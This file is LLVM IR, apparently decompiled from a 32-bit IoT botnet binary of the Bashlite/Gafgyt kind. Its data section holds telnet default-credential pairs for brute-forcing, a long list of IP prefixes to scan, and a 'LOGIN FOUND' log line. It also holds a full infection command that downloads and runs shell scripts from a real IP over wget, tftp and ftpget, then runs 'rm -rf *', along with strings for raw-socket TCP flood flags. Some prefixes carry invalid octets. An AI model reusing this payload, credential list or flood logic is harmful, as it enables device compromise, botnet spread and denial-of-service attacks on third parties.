source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805b00c.2 = global i32 0
@global_var_805b024.3 = local_unnamed_addr global i32* @global_var_805b00c.2
@global_var_805a624.4 = constant i32 0
@global_var_805b010.6 = local_unnamed_addr global i32 0
@global_var_805b560.7 = global i32 0
@global_var_805b564.8 = local_unnamed_addr global i32 0
@global_var_805b568.9 = local_unnamed_addr global i32 0
@global_var_805b290.10 = local_unnamed_addr global i32 4095
@global_var_805b28c.11 = local_unnamed_addr global i32 362436
@global_var_805765e.12 = constant [7 x i8] c"(null)\00"
@global_var_8057665.14 = constant [3 x i8] c"-c\00"
@global_var_805731b.15 = constant [3 x i8] c"sh\00"
@global_var_8057668.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8057680.17 = constant i32 -1
@global_var_8057a80.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_8057a8e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_805b540.20 = local_unnamed_addr global i32 0
@global_var_8057a97.21 = constant [5 x i8] c"PING\00"
@global_var_8057652.22 = constant [8 x i8] c"busybox\00"
@global_var_805765a.23 = constant i32 2293796
@global_var_805765c.24 = constant i32 1848115235
@global_var_805b240.25 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057652.22, i32 0, i32 0), i8* bitcast (i32* @global_var_805765a.23 to i8*), i8* bitcast (i32* @global_var_805765c.24 to i8*)]
@global_var_8057626.26 = constant [7 x i8] c"nvalid\00"
@global_var_805762d.27 = constant [6 x i8] c"ailed\00"
@global_var_8057633.28 = constant [9 x i8] c"ncorrect\00"
@global_var_805763c.29 = constant [6 x i8] c"enied\00"
@global_var_8057642.30 = constant [5 x i8] c"rror\00"
@global_var_8057647.31 = constant [7 x i8] c"oodbye\00"
@global_var_805764e.32 = constant [4 x i8] c"bad\00"
@global_var_805b220.33 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057626.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805762d.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057633.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805763c.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057642.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057647.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805764e.32, i32 0, i32 0)]
@global_var_805b548.34 = local_unnamed_addr global i32 0
@global_var_805b54c.35 = local_unnamed_addr global i32 0
@global_var_80617d4.36 = local_unnamed_addr global i32 0
@global_var_8057a9c.37 = constant [6 x i8] c":>%$#\00"
@global_var_805b557.38 = local_unnamed_addr global i32 0
@global_var_805b558.39 = local_unnamed_addr global i32 0
@global_var_8057aa3.42 = constant [12 x i8] c"177.5.%d.%d\00"
@global_var_8057aaf.43 = constant [15 x i8] c"1103.165.%d.%d\00"
@global_var_8057abe.44 = constant [12 x i8] c"185.3.%d.%d\00"
@global_var_8057aca.45 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_8057ad7.46 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_8057ae2.47 = constant [14 x i8] c"122.252.%d.%d\00"
@global_var_8057af0.48 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_8057afc.49 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_8057b09.50 = constant [14 x i8] c"103.186.%d.%d\00"
@global_var_8057b17.51 = constant [14 x i8] c"103.189.%d.%d\00"
@global_var_8057b25.52 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_8057b33.53 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_8057b3e.54 = constant [14 x i8] c"122.254.%d.%d\00"
@global_var_8057b4c.55 = constant [13 x i8] c"108.20.%d.%d\00"
@global_var_8057b59.56 = constant [13 x i8] c"108.47.%d.%d\00"
@global_var_8057b66.57 = constant [13 x i8] c"108.57.%d.%d\00"
@global_var_8057b73.58 = constant [14 x i8] c"45.1103.%d.%d\00"
@global_var_8057b81.59 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8057b8e.60 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_8057b9b.61 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_8057ba6.62 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_8057bb2.63 = constant [14 x i8] c"122.204.%d.%d\00"
@global_var_8057bc0.64 = constant [12 x i8] c"177.0.%d.%d\00"
@global_var_8057bcc.65 = constant [12 x i8] c"177.8.%d.%d\00"
@global_var_8057bd8.66 = constant [13 x i8] c"177.91.%d.%d\00"
@global_var_8057be5.67 = constant [13 x i8] c"177.54.%d.%d\00"
@global_var_8057bf2.68 = constant [13 x i8] c"177.98.%d.%d\00"
@global_var_8057bff.69 = constant [14 x i8] c"177.177.%d.%d\00"
@global_var_8057c0d.70 = constant [14 x i8] c"177.192.%d.%d\00"
@global_var_8057c1b.71 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_8057c27.72 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_8057c34.73 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_8057c40.74 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_8057c4b.75 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_8057c57.76 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_8057c63.77 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_8057c6f.78 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_8057c7b.79 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_8057c87.80 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8057c94.81 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_8057ca1.82 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_8057cae.83 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_8057cbb.84 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_8057cc8.85 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_8057cd5.86 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_8057ce2.87 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_8057cef.88 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_8057cfc.89 = constant [13 x i8] c"108.54.%d.%d\00"
@global_var_8057d09.90 = constant [14 x i8] c"177.255.%d.%d\00"
@global_var_8057d17.91 = constant [14 x i8] c"108.204.%d.%d\00"
@global_var_8057d25.92 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_8057d32.93 = constant [14 x i8] c"104.191.%d.%d\00"
@global_var_8057d40.94 = constant [15 x i8] c"1103.100.%d.%d\00"
@global_var_8057d4f.95 = constant [14 x i8] c"104.188.%d.%d\00"
@global_var_8057d5d.96 = constant [14 x i8] c"104.189.%d.%d\00"
@global_var_8057d6b.97 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_8057d78.98 = constant [14 x i8] c"122.160.%d.%d\00"
@global_var_8057d86.99 = constant [14 x i8] c"122.161.%d.%d\00"
@global_var_8057d94.100 = constant [14 x i8] c"122.162.%d.%d\00"
@global_var_8057da2.101 = constant [14 x i8] c"122.163.%d.%d\00"
@global_var_8057db0.102 = constant [14 x i8] c"122.164.%d.%d\00"
@global_var_8057dbe.103 = constant [14 x i8] c"122.165.%d.%d\00"
@global_var_8057dcc.104 = constant [14 x i8] c"122.166.%d.%d\00"
@global_var_8057dda.105 = constant [14 x i8] c"122.167.%d.%d\00"
@global_var_8057de8.106 = constant [14 x i8] c"122.168.%d.%d\00"
@global_var_8057df6.107 = constant [14 x i8] c"122.169.%d.%d\00"
@global_var_8057e04.108 = constant [14 x i8] c"122.170.%d.%d\00"
@global_var_8057e12.109 = constant [14 x i8] c"122.171.%d.%d\00"
@global_var_8057e20.110 = constant [14 x i8] c"122.172.%d.%d\00"
@global_var_8057e2e.111 = constant [14 x i8] c"122.173.%d.%d\00"
@global_var_8057e3c.112 = constant [14 x i8] c"122.174.%d.%d\00"
@global_var_8057e4a.113 = constant [14 x i8] c"122.177.%d.%d\00"
@global_var_8057e58.114 = constant [14 x i8] c"122.176.%d.%d\00"
@global_var_8057e66.115 = constant [15 x i8] c"122.1103.%d.%d\00"
@global_var_8057e75.116 = constant [14 x i8] c"122.179.%d.%d\00"
@global_var_8057e83.117 = constant [14 x i8] c"122.180.%d.%d\00"
@global_var_8057e91.118 = constant [16 x i8] c"122.11103.%d.%d\00"
@global_var_8057ea1.119 = constant [14 x i8] c"122.182.%d.%d\00"
@global_var_8057eaf.120 = constant [14 x i8] c"122.183.%d.%d\00"
@global_var_8057ebd.121 = constant [14 x i8] c"122.184.%d.%d\00"
@global_var_8057ecb.122 = constant [15 x i8] c"122.1185.%d.%d\00"
@global_var_8057eda.123 = constant [14 x i8] c"122.186.%d.%d\00"
@global_var_8057ee8.124 = constant [14 x i8] c"122.187.%d.%d\00"
@global_var_8057ef6.125 = constant [14 x i8] c"122.188.%d.%d\00"
@global_var_8057f04.126 = constant [14 x i8] c"122.189.%d.%d\00"
@global_var_8057f12.127 = constant [14 x i8] c"122.190.%d.%d\00"
@global_var_8057f20.128 = constant [14 x i8] c"122.191.%d.%d\00"
@global_var_8057f2e.129 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_8057f3b.130 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_8057f48.131 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_8057f55.132 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8057f62.133 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_8057f6f.134 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_8057f7c.135 = constant [14 x i8] c"103.188.%d.%d\00"
@global_var_8057f8a.136 = constant [14 x i8] c"45.1177.%d.%d\00"
@global_var_8057f98.137 = constant [13 x i8] c"108.30.%d.%d\00"
@global_var_8057fa5.138 = constant [13 x i8] c"122.33.%d.%d\00"
@global_var_8057fb2.139 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_8057fbf.140 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_8057fcc.141 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_8057fd9.142 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_8057fe5.143 = constant [14 x i8] c"122.253.%d.%d\00"
@global_var_8057ff3.144 = constant [15 x i8] c"1103.173.%d.%d\00"
@global_var_8058002.145 = constant [14 x i8] c"104.190.%d.%d\00"
@global_var_8058010.146 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_805801d.147 = constant [14 x i8] c"177.196.%d.%d\00"
@global_var_805802b.148 = constant [15 x i8] c"104.1103.%d.%d\00"
@global_var_805803a.149 = constant [13 x i8] c"177.45.%d.%d\00"
@global_var_8058047.150 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8058055.151 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_8058062.152 = constant [13 x i8] c"108.44.%d.%d\00"
@global_var_805806f.153 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_805807d.154 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_805808b.155 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_8058099.156 = constant [15 x i8] c"1103.177.%d.%d\00"
@global_var_80580a8.157 = constant [14 x i8] c"1103.93.%d.%d\00"
@global_var_80580b6.158 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_80580c2.159 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_80580d0.160 = constant [14 x i8] c"104.174.%d.%d\00"
@global_var_80580de.161 = constant [14 x i8] c"104.160.%d.%d\00"
@global_var_80580ec.162 = constant [14 x i8] c"104.161.%d.%d\00"
@global_var_80580fa.163 = constant [14 x i8] c"104.162.%d.%d\00"
@global_var_8058108.164 = constant [14 x i8] c"104.163.%d.%d\00"
@global_var_8058116.165 = constant [14 x i8] c"104.164.%d.%d\00"
@global_var_8058124.166 = constant [14 x i8] c"104.165.%d.%d\00"
@global_var_8058132.167 = constant [14 x i8] c"104.166.%d.%d\00"
@global_var_8058140.168 = constant [14 x i8] c"104.167.%d.%d\00"
@global_var_805814e.169 = constant [14 x i8] c"104.168.%d.%d\00"
@global_var_805815c.170 = constant [14 x i8] c"104.169.%d.%d\00"
@global_var_805816a.171 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_8058177.172 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_8058184.173 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_8058191.174 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_805819e.175 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_80581ab.176 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_80581b8.177 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_80581c6.178 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_80581d4.179 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_80581e2.180 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_80581ef.181 = constant [14 x i8] c"122.208.%d.%d\00"
@global_var_80581fd.182 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_805820b.183 = constant [14 x i8] c"177.201.%d.%d\00"
@global_var_8058219.184 = constant [14 x i8] c"108.198.%d.%d\00"
@global_var_8058227.185 = constant [13 x i8] c"91.205.%d.%d\00"
@global_var_8058234.186 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_8058241.187 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_805824e.188 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_805825b.189 = constant [14 x i8] c"185.105.%d.%d\00"
@global_var_8058269.190 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_8058275.191 = constant [14 x i8] c"108.203.%d.%d\00"
@global_var_8058283.192 = constant [13 x i8] c"108.55.%d.%d\00"
@global_var_8058290.193 = constant [14 x i8] c"108.220.%d.%d\00"
@global_var_805829e.194 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_80582ac.195 = constant [14 x i8] c"108.242.%d.%d\00"
@global_var_80582ba.196 = constant [14 x i8] c"108.122.%d.%d\00"
@global_var_80582c8.197 = constant [14 x i8] c"108.195.%d.%d\00"
@global_var_80582d6.198 = constant [15 x i8] c"108.2122.%d.%d\00"
@global_var_80582e5.199 = constant [14 x i8] c"108.218.%d.%d\00"
@global_var_80582f3.200 = constant [14 x i8] c"108.225.%d.%d\00"
@global_var_8058301.201 = constant [14 x i8] c"108.228.%d.%d\00"
@global_var_805830f.202 = constant [14 x i8] c"108.231.%d.%d\00"
@global_var_805831d.203 = constant [13 x i8] c"108.60.%d.%d\00"
@global_var_805832a.204 = constant [14 x i8] c"108.248.%d.%d\00"
@global_var_8058338.205 = constant [14 x i8] c"108.253.%d.%d\00"
@global_var_8058346.206 = constant [14 x i8] c"108.255.%d.%d\00"
@global_var_8058354.207 = constant [13 x i8] c"108.35.%d.%d\00"
@global_var_8058361.208 = constant [13 x i8] c"108.49.%d.%d\00"
@global_var_805836e.209 = constant [13 x i8] c"108.62.%d.%d\00"
@global_var_805837b.210 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_8058388.211 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_8058395.212 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_80583a2.213 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_80583af.214 = constant [14 x i8] c"104.176.%d.%d\00"
@global_var_80583bd.215 = constant [14 x i8] c"104.177.%d.%d\00"
@global_var_80583cb.216 = constant [14 x i8] c"104.183.%d.%d\00"
@global_var_80583d9.217 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_80583e7.218 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_80583f5.219 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_8058402.220 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_805840f.221 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_805841d.222 = constant [17 x i8] c"1103.11103.%d.%d\00"
@global_var_805842e.223 = constant [16 x i8] c"1103.1103.%d.%d\00"
@global_var_805843e.224 = constant [15 x i8] c"1103.176.%d.%d\00"
@global_var_805844d.225 = constant [15 x i8] c"1103.170.%d.%d\00"
@global_var_805845c.226 = constant [15 x i8] c"1103.171.%d.%d\00"
@global_var_805846b.227 = constant [15 x i8] c"1103.162.%d.%d\00"
@global_var_805847a.228 = constant [13 x i8] c"177.26.%d.%d\00"
@global_var_8058487.229 = constant [13 x i8] c"177.28.%d.%d\00"
@global_var_8058494.230 = constant [13 x i8] c"177.29.%d.%d\00"
@global_var_80584a1.231 = constant [13 x i8] c"177.30.%d.%d\00"
@global_var_80584ae.232 = constant [13 x i8] c"177.31.%d.%d\00"
@global_var_80584bb.233 = constant [14 x i8] c"203.191.%d.%d\00"
@global_var_80584c9.234 = constant [13 x i8] c"91.233.%d.%d\00"
@global_var_80617c8.235 = local_unnamed_addr global i32 0
@global_var_80575c1.236 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_80575d0.237 = constant [6 x i8] c"/tmp/\00"
@global_var_80575d6.238 = constant [6 x i8] c"/var/\00"
@global_var_80575dc.239 = constant [6 x i8] c"/dev/\00"
@global_var_80575e2.240 = constant [10 x i8] c"/var/run/\00"
@global_var_80575ec.241 = constant [10 x i8] c"/dev/shm/\00"
@global_var_80575f6.242 = constant [6 x i8] c"/mnt/\00"
@global_var_80575fc.243 = constant [7 x i8] c"/boot/\00"
@global_var_8057603.244 = constant [6 x i8] c"/usr/\00"
@global_var_8057609.245 = constant [6 x i8] c"/opt/\00"
@global_var_805b1e0.246 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_80575c1.236, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80575d0.237, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80575d6.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80575dc.239, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80575e2.240, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80575ec.241, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80575f6.242, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80575fc.243, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057603.244, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057609.245, i32 0, i32 0)]
@global_var_805b20c = external global i32
@global_var_80584d6.251 = constant [3 x i8] c"\0D\0A\00"
@global_var_805b260.252 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057626.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805762d.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057633.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805763c.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057642.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057647.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805764e.32, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057652.22, i32 0, i32 0), i8* bitcast (i32* @global_var_805765a.23 to i8*), i8* bitcast (i32* @global_var_805765c.24 to i8*)]
@global_var_80584d9.253 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_80584f0.254 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_80584f5.255 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_8057404.256 = constant [412 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/rooty.sh; chmod 777 rooty.sh; sh rooty.sh; tftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.112.107 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf rooty.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_80575a0.257 = constant [5 x i8] c"root\00"
@global_var_80575a6.258 = constant [6 x i8] c"admin\00"
@global_var_80575ad.259 = constant [7 x i8] c"telnet\00"
@global_var_80575b5.260 = constant [5 x i8] c"1111\00"
@global_var_80575bb.261 = constant [5 x i8] c"1234\00"
@global_var_805b1a0.262 = local_unnamed_addr global [9 x i8*] [i8* getelementptr inbounds ([412 x i8], [412 x i8]* @global_var_8057404.256, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80575a0.257, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80575a6.258, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80575ad.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80575a6.258, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80575a0.257, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80575b5.260, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80575ad.259, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80575bb.261, i32 0, i32 0)]
@global_var_8058520.263 = constant [6 x i8] c"arfgG\00"
@global_var_8058526.264 = constant [9 x i8] c"HBiug655\00"
@global_var_805852f.265 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_805853c.266 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_8058550.267 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_8058561.268 = constant [12 x i8] c"GJjyur67458\00"
@global_var_805856d.269 = constant [12 x i8] c"RYSDk747586\00"
@global_var_8058579.270 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_8058585.271 = constant [10 x i8] c"KHGK7985i\00"
@global_var_805858f.272 = constant [11 x i8] c"yuituiILYF\00"
@global_var_805859a.273 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_80585a8.274 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_80585b4.275 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_80585c1.276 = constant [9 x i8] c"ewqdcftr\00"
@global_var_80585ca.277 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_80585da.278 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_80585e5.279 = constant [12 x i8] c"twehgbferhb\00"
@global_var_80585f1.280 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_80585fd.281 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_805860b.282 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8058619.283 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_8058627.284 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_8058631.285 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_805863f.286 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_805864d.287 = constant [12 x i8] c"yteytietyue\00"
@global_var_8058659.288 = constant [9 x i8] c"qsortEQS\00"
@global_var_8058662.289 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_8058672.290 = constant [4 x i8] c"std\00"
@global_var_8058676.291 = constant [4 x i8] c"dts\00"
@global_var_805867a.292 = constant [4 x i8] c"lsk\00"
@global_var_805867e.293 = constant [4 x i8] c"kek\00"
@global_var_8058682.294 = constant [6 x i8] c"smack\00"
@global_var_8058688.295 = constant [4 x i8] c"ily\00"
@global_var_805868c.296 = constant [4 x i8] c"tyf\00"
@global_var_8058690.297 = constant [4 x i8] c"pos\00"
@global_var_8058694.298 = constant [6 x i8] c"cunts\00"
@global_var_80586a0.299 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058520.263, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058526.264, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805852f.265, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805853c.266, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8058550.267, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058561.268, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805856d.269, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058579.270, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058585.271, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805858f.272, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805859a.273, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80585a8.274, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80585b4.275, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80585c1.276, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80585ca.277, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80585da.278, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80585e5.279, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80585f1.280, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80585fd.281, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805860b.282, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058619.283, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058627.284, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058631.285, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805863f.286, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805864d.287, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058659.288, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8058662.289, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058672.290, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058676.291, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805867a.292, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805867e.293, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058682.294, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058688.295, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805868c.296, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058690.297, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058694.298, i32 0, i32 0)]
@global_var_8058730.300 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805874c.301 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_805876d.302 = constant [4 x i8] c"all\00"
@global_var_8058771.303 = constant i32 2037579820
@global_var_8058773.304 = constant [4 x i8] c"syn\00"
@global_var_8058777.305 = constant [4 x i8] c"rst\00"
@global_var_805877b.306 = constant [4 x i8] c"fin\00"
@global_var_805877f.307 = constant [4 x i8] c"ack\00"
@global_var_8058783.308 = constant [4 x i8] c"psh\00"
@global_var_8058787.309 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_8057220.310 = constant [5 x i8] c"mips\00"
@global_var_8057225.311 = constant [7 x i8] c"mipsel\00"
@global_var_805722c.312 = constant [4 x i8] c"sh4\00"
@global_var_8057230.313 = constant [4 x i8] c"x86\00"
@global_var_8057234.314 = constant [5 x i8] c"i686\00"
@global_var_8057239.315 = constant [4 x i8] c"ppc\00"
@global_var_805723d.316 = constant [5 x i8] c"i586\00"
@global_var_8057242.317 = constant [8 x i8] c"jackmy*\00"
